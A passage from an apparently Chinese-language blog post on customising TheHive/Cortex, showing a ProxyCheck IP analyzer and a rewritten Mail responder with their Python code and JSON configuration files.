encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> proxycheck <span class="keyword">import</span> ProxyCheck</span><br><span class="line"><span class="keyword">from</span> cortexutils.analyzer <span class="keyword">import</span> Analyzer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyCheckAnalyzer</span>(<span class="params">Analyzer</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        Analyzer.__init__(self)</span><br><span class="line">        self.service = self.get_param(</span><br><span class="line">            <span class="string">&#x27;config.service&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;Service parameter is missing&#x27;</span>)</span><br><span class="line">        self.key = self.get_param(</span><br><span class="line">            <span class="string">&#x27;config.key&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;Missing ProxyCheck API key&#x27;</span>)</span><br><span class="line">        self.polling_interval = self.get_param(<span class="string">&#x27;config.polling_interval&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">        self.proxycheck = ProxyCheck(self.key)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">summary</span>(<span class="params">self, raw</span>):</span></span><br><span class="line">        taxonomies = []</span><br><span class="line">        level = <span class="string">&quot;info&quot;</span></span><br><span class="line">        namespace = <span class="string">&quot;ProxyCheck&quot;</span></span><br><span class="line">        predicate = <span class="string">&quot;Proxy&quot;</span></span><br><span class="line">        value = <span class="string">&quot;False&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> raw.get(<span class="string">&quot;proxy&quot;</span>) == <span class="string">&quot;yes&quot;</span>:</span><br><span class="line">            level = <span class="string">&quot;suspicious&quot;</span></span><br><span class="line">            value = <span class="string">&quot;True&quot;</span></span><br><span class="line"></span><br><span class="line">        taxonomies.append(self.build_taxonomy(</span><br><span class="line">            level, namespace, predicate, value))</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;taxonomies&quot;</span>: taxonomies&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.service == <span class="string">&#x27;proxycheck&#x27;</span>:</span><br><span class="line">            data = self.get_param(<span class="string">&#x27;data&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;Data is missing&#x27;</span>)</span><br><span class="line">            results = self.proxycheck.check_proxy(data)</span><br><span class="line">            self.report(results)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.error(<span class="string">&#x27;Invalid data type&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ProxyCheckAnalyzer().run()</span><br></pre></td></tr></table></figure>

<ul>
<li><em><strong>ProxyCheck.json</strong></em></li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProxyCheck&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;Canon&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;https://github.com/TheHive-Project/Cortex-Analyzers&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;license&quot;</span>: <span class="string">&quot;AGPL-V3&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Get the compromise information of IP from ProxyCheck.&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;dataTypeList&quot;</span>: [<span class="string">&quot;ip&quot;</span>],</span><br><span class="line">  <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;ProxyCheck/proxycheck_analyzer.py&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;baseConfig&quot;</span>: <span class="string">&quot;ProxyCheck&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;config&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;service&quot;</span>: <span class="string">&quot;proxycheck&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;configurationItems&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;key&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;API key for ProxyCheck&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;required&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;polling_interval&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Define time interval between two requests attempts for the report&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;number&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;required&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;defaultValue&quot;</span>: <span class="number">60</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Responders-插件"><a href="#Responders-插件" class="headerlink" title="Responders - 插件"></a>Responders - 插件</h3><h4 id="Mail"><a href="#Mail" class="headerlink" title="Mail"></a>Mail</h4><p>​    <em>Cortex</em>默认有一个插件（<em>Mailer</em>）负责发送邮件。使用了一下发现比较“坑”，首先不支持对多个收件人的发送，且当选择从<em>Observables</em>中发送邮件时，收件人竟然是<em>mail</em>类型的<em>IoC</em>。。。 WTF！别问我怎么知道的，它源码里就是这么写的。。。所以，自己动手丰衣足食！</p>
<p><strong>主要功能：</strong></p>
<ol>
<li>在原有的基础上新增了批量发送的功能；</li>
<li>新增了支持对<em>task logs</em>数据类型的发送；</li>
<li>发送邮件时会附带当前<em>case</em>或者<em>task</em>的<em>URL</em>，便于收件人快速浏览问题；    </li>
</ol>
<ul>
<li><em>mail.py</em></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">import</span> mistune</span><br><span class="line"><span class="keyword">from</span> cortexutils.responder <span class="keyword">import</span> Responder</span><br><span class="line"><span class="keyword">from</span> email.mime.multipart <span class="keyword">import</span> MIMEMultipart</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mail</span>(<span class="params">Responder</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        Responder.__init__(self)</span><br><span class="line">        self.smtp_host = self.get_param(<span class="string">&quot;config.smtp_host&quot;</span>, <span class="string">&quot;localhost&quot;</span>)</span><br><span class="line">        self.smtp_port = self.get_param(<span class="string">&quot;config.smtp_port&quot;</span>, <span class="string">&quot;25&quot;</span>)</span><br><span class="line">        self.mail_from = self.get_param(</span><br><span class="line">            <span class="string">&quot;config.from&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;Missing sender email address&quot;</span></span><br><span class="line">        )</span><br><span class="line">        self.smtp_user = self.get_param(<span class="string">&quot;config.smtp_user&quot;</span>, <span class="string">&quot;user&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">        self.smtp_pwd = self.get_param(<span class="string">&quot;config.smtp_pwd&quot;</span>, <span class="string">&quot;pwd&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">        self.thehive_url = self.get_param(<span class="string">&quot;config.thehive_url&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create_links</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Create TheHive links</span></span><br><span class="line"><span class="string">        :rtype: String</span></span><br><span class="line"><span class="string">        :return: URL</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.data_type == <span class="string">&quot;thehive:case&quot;</span>:</span><br><span class="line">            case_id = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.id&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;case id is missing&quot;</span></span><br><span class="line">            )</span><br><span class="line">            url =  self.thehive_url + <span class="string">&quot;/index.html#!/case/&#123;&#125;/details&quot;</span>.<span class="built_in">format</span>(case_id)</span><br><span class="line">        <span class="keyword">elif</span> self.data_type == <span class="string">&quot;thehive:case_task&quot;</span>:</span><br><span class="line">            case_id = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.case.id&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;case id is missing&quot;</span></span><br><span class="line">            )</span><br><span class="line">            task_id = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.id&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;task id is missing&quot;</span></span><br><span class="line">            )</span><br><span class="line">            url =  self.thehive_url + <span class="string">&quot;/index.html#!/case/&#123;&#125;/tasks/&#123;&#125;&quot;</span>.<span class="built_in">format</span>(case_id, task_id)</span><br><span class="line">        <span class="keyword">elif</span> self.data_type == <span class="string">&quot;thehive:case_task_log&quot;</span>:</span><br><span class="line">            case_id = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.case_task.case.id&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;case id is missing&quot;</span></span><br><span class="line">            )</span><br><span class="line">            task_id = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.case_task.id&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;task id is missing&quot;</span></span><br><span class="line">            )</span><br><span class="line">            url =  self.thehive_url + <span class="string">&quot;/index.html#!/case/&#123;&#125;/tasks/&#123;&#125;&quot;</span>.<span class="built_in">format</span>(case_id, task_id)</span><br><span class="line">        <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        Responder.run(self)</span><br><span class="line">        <span class="keyword">if</span> self.data_type == <span class="string">&quot;thehive:case_task_log&quot;</span>:</span><br><span class="line">            title = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.case_task.title&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;title is missing&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            title = self.get_param(<span class="string">&quot;data.title&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;title is missing&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.data_type <span class="keyword">in</span> [<span class="string">&quot;thehive:case&quot;</span>, <span class="string">&quot;thehive:case_task&quot;</span>]:</span><br><span class="line">            description = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.description&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;case description is missing&quot;</span></span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">elif</span> self.data_type == <span class="string">&quot;thehive:case_task_log&quot;</span>:</span><br><span class="line">            description = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.message&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;task logs description is missing&quot;</span></span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">elif</span> self.data_type == <span class="string">&quot;thehive:alert&quot;</span>:</span><br><span class="line">            description = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.case.description&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;alert description is missing&quot;</span></span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.error(<span class="string">&quot;Invalid dataType&quot;</span>)</span><br><span class="line"></span><br><span class="line">        mail_to = []</span><br><span class="line">        <span class="keyword">if</span> self.data_type == <span class="string">&quot;thehive:case&quot;</span>:</span><br><span class="line">            <span class="comment"># Search recipient address in case tags</span></span><br><span class="line">            tags = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.tags&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;recipient address not found in tags&quot;</span></span><br><span class="line">            )</span><br><span class="line">            mail_tags = [t[<span class="number">5</span>:] <span class="keyword">for</span> t <span class="keyword">in</span> tags <span class="keyword">if</span> t.startswith(<span class="string">&quot;mail:&quot;</span>)]</span><br><span class="line">            <span class="keyword">if</span> mail_tags:</span><br><span class="line">                mail_to = mail_tags</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.error(<span class="string">&quot;recipient address not found in tags&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> self.data_type <span class="keyword">in</span> [<span class="string">&quot;thehive:case_task&quot;</span>, <span class="string">&quot;thehive:case_task_log&quot;</span>]:</span><br><span class="line">            <span class="comment"># Search recipient address in tasks description</span></span><br><span class="line">            descr_array = description.splitlines()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;mailto:&quot;</span> <span class="keyword">in</span> descr_array[<span class="number">0</span>]:</span><br><span class="line">                mail_str = descr_array[<span class="number">0</span>].replace(<span class="string">&quot;mailto:&quot;</span>, <span class="string">&quot;&quot;</span>).strip()</span><br><span class="line">                mail_to = [i.strip() <span class="keyword">for</span> i <span class="keyword">in</span> mail_str.split(<span class="string">&#x27;,&#x27;</span>)]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.error(<span class="string">&quot;recipient address not found in description&quot;</span>)</span><br><span class="line">            <span class="comment"># Set rest of description as body</span></span><br><span class="line">            description = <span class="string">&quot;\n&quot;</span>.join(descr_array[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> self.data_type == <span class="string">&quot;thehive:alert&quot;</span>:</span><br><span class="line">            <span class="comment"># Search recipient address in artifacts</span></span><br><span class="line">            artifacts = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.artifacts&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;recipient address not found in observables&quot;</span></span><br><span class="line">            )</span><br><span class="line">            mail_artifacts = [</span><br><span class="line">                a[<span class="string">&quot;data&quot;</span>] </span><br><span class="line">                <span class="keyword">for</span> a <span class="keyword">in</span> artifacts </span><br><span class="line">                <span class="keyword">if</span> a.get(<span class="string">&quot;dataType&quot;</span>) == <span class="string">&quot;mail&quot;</span> <span class="keyword">and</span> <span class="string">&quot;data&quot;</span> <span class="keyword">in</span> a</span><br><span class="line">            ]</span><br><span class="line">            mail_tags = [</span><br><span class="line">                t[<span class="number">5</span>:]</span><br><span class="line">                <span class="keyword">for</span> t <span class="keyword">in</span> mail_artifacts</span><br><span class="line">                <span class="keyword">if</span> t.startswith(<span class="string">&quot;mail:&quot;</span>)</span><br><span class="line">            ]</span><br><span class="line">            <span class="keyword">if</span> mail_tags:</span><br><span class="line">                mail_to = mail_tags</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.error(<span class="string">&quot;recipient address not found in observables&quot;</span>)</span><br><span class="line"></span><br><span class="line">        msg = MIMEMultipart()</span><br><span class="line">        msg[<span class="string">&quot;Subject&quot;</span>] = title</span><br><span class="line">        msg[<span class="string">&quot;From&quot;</span>] = self.mail_from</span><br><span class="line">        msg[<span class="string">&quot;To&quot;</span>] = <span class="string">&#x27;,&#x27;</span>.join(mail_to)</span><br><span class="line">        <span class="comment"># Markdown to HTML</span></span><br><span class="line">        content = mistune.markdown(description, escape=<span class="literal">True</span>, hard_wrap=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># add TheHive Links</span></span><br><span class="line">        links = self.create_links()</span><br><span class="line">        content += <span class="string">&#x27;\n&lt;p&gt;&lt;a href=&quot;&#123;&#125;&quot;&gt;Click me to TheHive&lt;/a&gt;&lt;/p&gt;\n&#x27;</span>.<span class="built_in">format</span>(links)</span><br><span class="line">        msg.attach(MIMEText(content, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.smtp_user <span class="keyword">and</span> self.smtp_pwd:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                context = ssl.create_default_context()</span><br><span class="line">                <span class="keyword">with</span> smtplib.SMTP(self.smtp_host, self.smtp_port) <span class="keyword">as</span> server:</span><br><span class="line">                    server.ehlo()</span><br><span class="line">                    server.starttls(context=context)</span><br><span class="line">                    server.ehlo()</span><br><span class="line">                    server.login(self.smtp_user, self.smtp_pwd)</span><br><span class="line">                    server.send_message(msg, self.mail_from, mail_to)</span><br><span class="line">            <span class="keyword">except</span> smtplib.SMTPNotSupportedError:</span><br><span class="line">                <span class="keyword">with</span> smtplib.SMTP(self.smtp_host, self.smtp_port) <span class="keyword">as</span> server:</span><br><span class="line">                    server.ehlo()</span><br><span class="line">                    server.login(self.smtp_user, self.smtp_pwd)</span><br><span class="line">                    server.send_message(msg, self.mail_from, mail_to)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">with</span> smtplib.SMTP(self.smtp_host, self.smtp_port) <span class="keyword">as</span> server:</span><br><span class="line">                server.send_message(msg, self.mail_from, mail_to)</span><br><span class="line"></span><br><span class="line">        self.report(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;message sent&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">operations</span>(<span class="params">self, raw</span>):</span></span><br><span class="line">        <span class="keyword">return</span> [self.build_operation(<span class="string">&quot;AddTagToCase&quot;</span>, tag=<span class="string">&quot;mail sent&quot;</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Mail().run()</span><br></pre></td></tr></table></figure>

<ul>
<li><em>Mail.json</em></li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Mail&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;Canon&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;https://github.com/TheHive-Project/Cortex-Analyzers&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;license&quot;</span>: <span class="string">&quot;AGPL-V3&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Send an email with information from a TheHive case or alert&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;dataTypeList&quot;</span>: [<span class="string">&quot;thehive:case&quot;</span>, <span class="string">&quot;thehive:alert&quot;</span>, <span class="string">&quot;thehive:case_task&quot;</span>, <span class="string">&quot;thehive:case_task_log&quot;</span>],</span><br><span class="line">  <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;Mail/mail.py&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;baseConfig&quot;</span>: <span class="string">&quot;Mail&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;configurationItems&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;from&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;email address from which the mail is send&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;required&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;smtp_host&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;SMTP server used to send mail&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;required&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">&quot;defaultValue&quot;</span>: <span class="string">&quot;localhost&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;smtp_port&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;SMTP server port&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;number&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;required&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">&quot;defaultValue&quot;</span>: <span class="number">25</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;smtp_user&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;SMTP server user&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;required&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;defaultValue&quot;</span>: <span class="string">&quot;user&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;smtp_pwd&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;SMTP server password&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;required&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;defaultValue&quot;</span>: <span class="string">&quot;pwd&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;thehive_url&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;TheHive server address&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;required&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">&quot;defaultValue&quot;</span>: <span class="string">&quot;http://localhost:9000&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Threat-Intelligence"><a href="#Threat-Intelligence" class="headerlink" title="Threat Intelligence"></a>Threat Intelligence</h3><p>​    其实默认<em>TheHive</em>是推荐与<em>MISP</em>进行对接实现情报的<em>feed</em>。由于我们自建了威胁情报库，所以写了一个Responders插件，帮助在分析时提交IoC情报。这边代码就不上了。给出一个提交的用例：</p>
